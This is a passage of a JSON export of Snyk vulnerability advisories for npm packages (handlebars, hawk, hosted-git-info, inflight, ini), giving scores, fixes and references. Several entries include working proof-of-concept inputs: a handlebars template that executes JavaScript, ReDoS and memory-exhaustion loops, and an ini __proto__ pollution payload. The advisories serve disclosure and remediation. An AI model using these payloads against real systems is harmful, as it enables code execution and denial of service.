        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. The package's lookup helper doesn't validate templates correctly, allowing attackers to submit templates that execute arbitrary JavaScript in the system.\n## PoC\n```\r\n\t{{#with split as |a|}}\r\n\t\t{{pop (push \"alert('Vulnerable Handlebars JS');\")}}\r\n\t\t{{#with (concat (lookup join (slice 0 1)))}}\r\n\t\t\t{{#each (slice 2 3)}}\r\n\t\t\t\t{{#with (apply 0 a)}}\r\n\t\t\t\t\t{{.}}\r\n\t\t\t\t{{/with}}\r\n\t\t\t{{/each}}\r\n\t\t{{/with}}\r\n\t{{/with}}\r\n{{/with}}\r\n```\n## Remediation\nUpgrade `handlebars` to version 3.0.8, 4.5.3 or higher.\n## References\n- [NPM Security Advisory #1](https://www.npmjs.com/advisories/1316)\n- [NPM Security Advisory #2](https://www.npmjs.com/advisories/1324)\n",
        "created_at": "2019-11-15T15:45:34Z",
        "updated_at": "2024-03-11T09:53:47Z",
        "problems": [
          {
            "id": "CVE-2019-20920",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.8 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.8"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.8,>=4.0.0 <4.5.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-11-14T15:29:41Z",
            "exploit": "Proof of Concept",
            "publication_time": "2019-11-15T15:48:43Z",
            "references": [
              {
                "url": "https://www.npmjs.com/advisories/1316",
                "title": "NPM Security Advisory #1"
              },
              {
                "url": "https://www.npmjs.com/advisories/1324",
                "title": "NPM Security Advisory #2"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-534988",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\n\nAffected versions of this package are vulnerable to Prototype Pollution.\nIt is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.\n\n## Details\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\r\n\r\nThere are two main ways in which the pollution of prototypes occurs:\r\n\r\n-   Unsafe `Object` recursive merge\r\n    \r\n-   Property definition by path\r\n    \r\n\r\n### Unsafe Object recursive merge\r\n\r\nThe logic of a vulnerable recursive merge function follows the following high-level model:\r\n```\r\nmerge (target, source)\r\n\r\n  foreach property of source\r\n\r\n    if property exists and is an object on both the target and the source\r\n\r\n      merge(target[property], source[property])\r\n\r\n    else\r\n\r\n      target[property] = source[property]\r\n```\r\n<br>  \r\n\r\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\r\n\r\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\r\n\r\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\r\n\r\n### Property definition by path\r\n\r\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\r\n\r\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\r\n\r\n## Types of attacks\r\n\r\nThere are a few methods by which Prototype Pollution can be manipulated:\r\n\r\n| Type |Origin  |Short description |\r\n|--|--|--|\r\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\r\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\r\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\r\n\r\n## Affected environments\r\n\r\nThe following environments are susceptible to a Prototype Pollution attack:\r\n\r\n-   Application server\r\n    \r\n-   Web server\r\n    \r\n\r\n## How to prevent\r\n\r\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\r\n    \r\n2.  Require schema validation of JSON input.\r\n    \r\n3.  Avoid using unsafe recursive merge functions.\r\n    \r\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\r\n    \r\n5.  As a best practice use `Map` instead of `Object`.\r\n\r\n### For more information on this vulnerability type:\r\n\r\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\n\nUpgrade `handlebars` to version 3.0.8, 4.5.3 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7)\n\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1325)\n",
        "created_at": "2019-11-20T09:54:27Z",
        "updated_at": "2024-03-06T14:09:22Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.8 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.8"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.8,>=4.0.0 <4.5.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "critical",
            "score": 9.8,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "effective_severity_level": "critical",
        "slots": [
          {
            "disclosure_time": "2019-11-18T19:42:01Z",
            "exploit": "Not Defined",
            "publication_time": "2019-11-20T09:55:17Z",
            "references": [
              {
                "url": "https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7",
                "title": "GitHub Commit"
              },
              {
                "url": "https://www.npmjs.com/advisories/1325",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-567742",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. Prototype access to the template engine allows for potential code execution.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `handlebars` to version 4.6.0 or higher.\n## References\n- [GitHub PR](https://github.com/handlebars-lang/handlebars.js/pull/1633)\n- [HackerOne Report](https://hackerone.com/reports/726364)\n",
        "created_at": "2020-04-28T14:26:34Z",
        "updated_at": "2024-03-06T13:57:10Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.6.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.6.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.6.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-04-27T22:13:11Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-04-28T14:28:34Z",
            "references": [
              {
                "url": "https://github.com/handlebars-lang/handlebars.js/pull/1633",
                "title": "GitHub PR"
              },
              {
                "url": "https://hackerone.com/reports/726364",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HAWK-2808852",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[hawk](https://github.com/hueniverse/hawk) is a library for the HTTP Hawk Authentication Scheme.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in header parsing where each added character in the attacker's input increases the computation time exponentially.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `hawk` to version 9.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/mozilla/hawk/pull/286/commits/ade134119bf1fdc4909d00f5a952c966f0075ad3)\n- [GitHub PR](https://github.com/mozilla/hawk/pull/286)\n",
        "created_at": "2022-05-06T06:28:14Z",
        "updated_at": "2024-03-11T09:53:56Z",
        "problems": [
          {
            "id": "CVE-2022-29167",
            "source": "CVE"
          },
          {
            "id": "CWE-1333",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 9.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "9.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<9.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-05-06T06:18:15Z",
            "exploit": "Not Defined",
            "publication_time": "2022-05-06T14:22:54Z",
            "references": [
              {
                "url": "https://github.com/mozilla/hawk/pull/286/commits/ade134119bf1fdc4909d00f5a952c966f0075ad3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/mozilla/hawk/pull/286",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HAWK-6969142",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Authentication Bypass",
        "description": "## Overview\n[hawk](https://github.com/hueniverse/hawk) is a library for the HTTP Hawk Authentication Scheme.\n\nAffected versions of this package are vulnerable to Authentication Bypass. The incoming (client supplied) hash of the payload is trusted by the server and not verified before the signature is calculated.\r\n\r\nA malicious actor in the middle can alter the payload and the server side will not identify the modification occurred because it simply uses the client provided value instead of verify the hash provided against the modified payload.\r\n\r\nAccording to the [maintainers](https://github.com/mozilla/hawk/issues/284#issuecomment-1647125106) this issue is to be considered out of scope as \"payload hash validation is optional and up to developer to implement\".\n## Remediation\nThere is no fixed version for `hawk`.\n\n## References\n- [GitHub Commit](https://github.com/mozilla/hawk/commit/6096dadcca8bce9e4176ea4b3a64c0e6ca0bebdb)\n- [GitHub Gist](https://gist.github.com/chrisdlangton/cd32ad083294c56c509828a7b9f7e90e)\n- [GitHub Issue](https://github.com/mozilla/hawk/issues/284)\n- [GitHub Issue](https://github.com/mozilla/PyHawk/issues/38)\n- [GitHub PR](https://github.com/mozilla-services/hawkauthlib/pull/7)\n",
        "created_at": "2024-05-22T13:00:45Z",
        "updated_at": "2024-06-06T12:41:40Z",
        "problems": [
          {
            "id": "CWE-287",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "critical",
            "score": 9.3,
            "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/E:P"
          }
        ],
        "effective_severity_level": "critical",
        "slots": [
          {
            "disclosure_time": "2024-02-20T14:13:15Z",
            "exploit": "Proof of Concept",
            "publication_time": "2024-05-22T13:40:20Z",
            "references": [
              {
                "url": "https://github.com/mozilla/hawk/commit/6096dadcca8bce9e4176ea4b3a64c0e6ca0bebdb",
                "title": "GitHub Commit"
              },
              {
                "url": "https://gist.github.com/chrisdlangton/cd32ad083294c56c509828a7b9f7e90e",
                "title": "GitHub Gist"
              },
              {
                "url": "https://github.com/mozilla/hawk/issues/284",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/mozilla/PyHawk/issues/38",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/mozilla-services/hawkauthlib/pull/7",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HOSTEDGITINFO-1088355",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[hosted-git-info](https://www.npmjs.org/package/hosted-git-info) is a Provides metadata and conversions from repository urls for Github, Bitbucket and Gitlab\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression `shortcutMatch ` in the `fromUrl` function in index.js. The affected regular expression exhibits polynomial worst-case time complexity.\r\n\r\n### PoC by Yeting Li\r\n```\r\nvar hostedGitInfo = require(\"hosted-git-info\")\r\nfunction build_attack(n) {\r\n    var ret = \"a:\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"a\"\r\n    }\r\n    return ret + \"!\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n   if (i % 1000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       var parsedInfo = hostedGitInfo.fromUrl(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `hosted-git-info` to version 3.0.8, 2.8.9 or higher.\n## References\n- [GitHub Commit](https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3)\n",
        "created_at": "2021-03-23T16:13:42Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2021-23362",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.8 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.8"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=3.0.0 <3.0.8,<2.8.9"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-11-28T00:00:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-23T17:13:24Z",
            "references": [
              {
                "url": "https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-INFLIGHT-6095116",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Missing Release of Resource after Effective Lifetime",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Resource after Effective Lifetime via the `makeres` function due to improperly deleting keys from the `reqs` object after execution of callbacks. This behavior causes the keys to remain in the `reqs` object, which leads to resource exhaustion.\r\n\r\nExploiting this vulnerability results in crashing the `node` process or in the application crash.\r\n\r\n**Note:**\r\nThis library is not maintained, and currently, there is no fix for this issue. To overcome this vulnerability, several dependent packages have eliminated the use of this library.\r\n\r\nTo trigger the memory leak, an attacker would need to have the ability to execute or influence the asynchronous operations that use the inflight module within the application. This typically requires access to the internal workings of the server or application, which is not commonly exposed to remote users. Therefore, “Attack vector” is marked as “Local”.\n## PoC\n```js\r\nconst inflight = require('inflight');\r\n\r\nfunction testInflight() {\r\n  let i = 0;\r\n  function scheduleNext() {\r\n    let key = `key-${i++}`;\r\n    const callback = () => {\r\n    };\r\n    for (let j = 0; j < 1000000; j++) {\r\n      inflight(key, callback);\r\n    }\r\n\r\n    setImmediate(scheduleNext);\r\n  }\r\n\r\n\r\n  if (i % 100 === 0) {\r\n    console.log(process.memoryUsage());\r\n  }\r\n\r\n  scheduleNext();\r\n}\r\n\r\ntestInflight();\r\n```\n## Remediation\nThere is no fixed version for `inflight`.\n\n## References\n- [GitHub Issue](https://github.com/isaacs/inflight/issues/5)\n- [GitHub PR](https://github.com/logdna/logdna-agent/pull/157)\n",
        "created_at": "2023-11-30T12:51:43Z",
        "updated_at": "2024-03-13T12:24:01Z",
        "problems": [
          {
            "id": "CWE-772",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.2,
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2023-11-28T12:47:27Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-11-30T12:52:55Z",
            "references": [
              {
                "url": "https://github.com/isaacs/inflight/issues/5",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/logdna/logdna-agent/pull/157",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-INI-1048974",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[ini](https://www.npmjs.org/package/ini) is an An ini encoder/decoder for node\n\nAffected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with `ini.parse`, they will pollute the prototype on the application. This can be exploited further depending on the context.\r\n\r\n## PoC by Eugene Lim\r\n\r\npayload.ini\r\n```\r\n[__proto__]\r\npolluted = \"polluted\"\r\n```\r\n\r\npoc.js:\r\n```\r\nvar fs = require('fs')\r\nvar ini = require('ini')\r\n\r\nvar parsed = ini.parse(fs.readFileSync('./payload.ini', 'utf-8'))\r\nconsole.log(parsed)\r\nconsole.log(parsed.__proto__)\r\nconsole.log(polluted)\r\n```\r\n\r\n```\r\n> node poc.js\r\n{}\r\n{ polluted: 'polluted' }\r\n{ polluted: 'polluted' }\r\npolluted\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code 